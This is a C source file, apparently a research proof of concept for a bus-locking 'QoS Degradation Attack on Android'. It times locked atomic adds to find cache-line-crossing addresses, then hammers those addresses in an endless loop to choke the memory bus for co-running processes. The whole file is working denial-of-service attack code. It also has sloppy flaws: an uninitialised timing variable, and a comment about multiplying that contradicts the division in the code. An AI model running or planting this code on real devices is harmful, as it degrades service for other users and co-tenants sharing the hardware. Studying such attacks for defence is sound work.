#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h> // for usleep

//code from mehmet
//Hit by the Bus: QoS Degradation Attack on Android

void clflush(volatile void *p){
    asm volatile ("clflush (%0)" :: "r"(p));
}

inline uint64_t rdtscp(){
    unsigned long a, d;
    asm volatile ("rdtscp" : "=a" (a), "=d" (d));
    return a | ((uint64_t)d << 32);
}

inline int fadd( char * variable, int value ) {
		asm volatile("lock; xaddl %%eax, %2;"
                   :"=a" (value)                  //Output
                   :"a" (value), "m" (*variable)  //Input
                   :"memory");
		return value;
  }

////////////////////////////////////////////////////////////////////////////

void* instruction_flusher_mehmet(void*){

int i,j,start, end, temp, time, optime;
int bir = 1;
int iki = 2;
int set = 0;
int N = 64;
int firstline = 0;
int lastline = 0;
int size = (N+1)*8;
char *myalloc = (char*)malloc(size);
char *unaligned_addr = myalloc;
//char *unaligned_addr = myalloc+2;

printf("##### ###### ##### ###### #####\n");
printf("##### Instruction Flusher #####\n");
printf("##### ###### ##### ###### #####\n");

// Profiling Stage
for(i = 0; i < 10; i++){
		start = rdtscp();
    	temp = fadd(unaligned_addr+i,bir);
		optime += rdtscp() - start;
		}
	optime = optime/5; // timings are twice as fast in this loop before pfetching
	//that's why we multiply reg optime with 2
	printf("Regular atomic addition time: %d\n", optime);

// over-spanning cache address detection stage
printf("Finding Cache line crossing addresses\n");
set = 0;
for(i = 0; i < N; i++){
		start = rdtscp();
    	temp = fadd(unaligned_addr+i,bir);
		time = rdtscp() - start;
		if (time > 7*optime){
			if (set==0){
				firstline = i; 
				set = 1;
				}
			lastline = i;
			printf("Crossing address detected at: +%d\n",i);
			}
	//	printf("Addr %d addition took %d cycles\n",i,time);
	}
	printf("Operating on addresses between %d and %d\n", firstline, lastline);

while(1){
for(i = firstline; i <= lastline; i++){
		//clflush(unaligned_addr+i);
		//clflush(&bir);
//		start = rdtscp();
		temp = fadd(unaligned_addr+i,bir);
		//usleep(1);
//		time = rdtscp() - start;
//		printf("addr %d addition took %d cycles\n",i,time);
		}
	}

}